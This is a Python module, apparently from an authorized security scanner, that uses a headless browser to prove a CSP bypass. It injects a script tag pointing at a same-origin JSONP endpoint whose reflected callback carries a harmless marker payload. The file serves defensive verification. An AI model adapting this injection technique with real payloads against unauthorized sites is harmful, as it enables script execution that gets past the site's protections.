"""Real browser-level proof for a CSP bypass via a same-origin JSONP-style
endpoint (§2 step 2). A Content-Security-Policy that allows 'self' in
script-src has no way to distinguish a legitimate same-origin script from
one an attacker points at via a gadget already present on the page — if
that gadget is a JSONP-style endpoint that reflects its "callback"
parameter unescaped, a <script src="...?callback=PAYLOAD"> element loaded
from that exact origin runs PAYLOAD as live JavaScript despite the policy.

This navigates to the real CSP-protected page (so the browser applies
that page's actual policy, not a synthetic stand-in for it), then injects
the malicious <script> element the same way an attacker-controlled gadget
on the page already could — real proof that the policy doesn't actually
stop it, not just a claim based on the header text.
"""

import asyncio
import json
import uuid
from dataclasses import dataclass
from urllib.parse import quote

from playwright.async_api import Error as PlaywrightError
from playwright.async_api import async_playwright

from app.agents.browser_session import seed_authenticated_context
from app.agents.http_client import AuthenticatedSession

_NAVIGATION_TIMEOUT_MS = 10_000
# Same defensive backstop as app.agents.http_client's
# _HARD_REQUEST_TIMEOUT_SECONDS, and for the identical reason: a real,
# live-found scan hang where this exact function — under the real
# concurrent load of a full multi-agent scan (many other checks also
# launching real headless Chromium browsers at the same time) — never
# raised, never timed out on its own, and left the whole scan stuck at
# "running" forever with zero error and no diagnosable cause.
# playwright.chromium.launch() and page.evaluate()/wait_for_timeout()
# have no timeout of their own the way page.goto() does; wrapping the
# entire attempt in one explicit asyncio-level deadline guarantees
# forward progress regardless of which specific call inside it doesn't
# return, the same structural fix already applied to every HTTP request
# this codebase makes.
_HARD_PROOF_TIMEOUT_SECONDS = 30.0


@dataclass
class CspBypassProofResult:
    executed: bool
    screenshot_png: bytes | None


def _proof_marker() -> str:
    # Hex-only, no English prefix — see app.agents.xss_browser_proof's
    # _proof_marker for why that matters for payloads a filter might
    # inspect. Not strictly needed here (the JSONP endpoint's own
    # unescaped reflection is already confirmed deterministically before
    # this ever runs), but costs nothing and keeps the convention
    # consistent everywhere a marker gets embedded in an executed payload.
    return f"vfy{uuid.uuid4().hex[:12]}"


async def attempt_csp_bypass_proof(
    page_url: str,
    jsonp_url_template: str,
    *,
    headless: bool = True,
    session: AuthenticatedSession | None = None,
) -> CspBypassProofResult:
    """`jsonp_url_template` must contain a literal "{callback}" placeholder
    marking exactly where the confirmed-vulnerable "callback" query value
    goes (already known to reflect unescaped — see
    app.agents.csp_bypass._probe_jsonp_reflection).
    """
    try:
        return await asyncio.wait_for(
            _attempt_csp_bypass_proof(page_url, jsonp_url_template, headless=headless, session=session),
            timeout=_HARD_PROOF_TIMEOUT_SECONDS,
        )
    except (TimeoutError, asyncio.TimeoutError):
        return CspBypassProofResult(executed=False, screenshot_png=None)


async def _attempt_csp_bypass_proof(
    page_url: str,
    jsonp_url_template: str,
    *,
    headless: bool,
    session: AuthenticatedSession | None,
) -> CspBypassProofResult:
    marker = _proof_marker()
    # The trailing "//" comments out whatever the endpoint appends after
    # the reflected callback (the real JSON payload, "(...)")  so the
    # injected script is valid JS regardless of that payload's shape.
    payload_callback = f'window["{marker}"]=true;//'
    script_url = jsonp_url_template.format(callback=quote(payload_callback, safe=""))

    inject_js = (
        "var s = document.createElement('script');"
        f"s.src = {json.dumps(script_url)};"
        "document.body.appendChild(s);"
    )

    executed = False
    screenshot = None
    try:
        async with async_playwright() as playwright:
            browser = await playwright.chromium.launch(headless=headless)
            # See app.agents.macro's identical fix/rationale — an internal
            # staging target's self-signed/internal-CA cert shouldn't fail
            # this check when the analyst already has authorized, scoped
            # access to it.
            context = await browser.new_context(ignore_https_errors=True)
            await seed_authenticated_context(context, session, page_url)
            page = await context.new_page()
            try:
                await page.goto(page_url, wait_until="load", timeout=_NAVIGATION_TIMEOUT_MS)
                await page.evaluate(inject_js)
                # The injected <script> is a real network request the
                # browser's own CSP enforcement (or lack thereof) governs
                # — give it a moment to load and run before checking,
                # rather than racing it.
                await page.wait_for_timeout(1500)
                executed = bool(await page.evaluate(f'window["{marker}"] === true'))
                if executed:
                    screenshot = await page.screenshot(full_page=True)
            except PlaywrightError:
                executed = False
                screenshot = None
            await browser.close()
    except PlaywrightError:
        return CspBypassProofResult(executed=False, screenshot_png=None)

    return CspBypassProofResult(executed=executed, screenshot_png=screenshot)
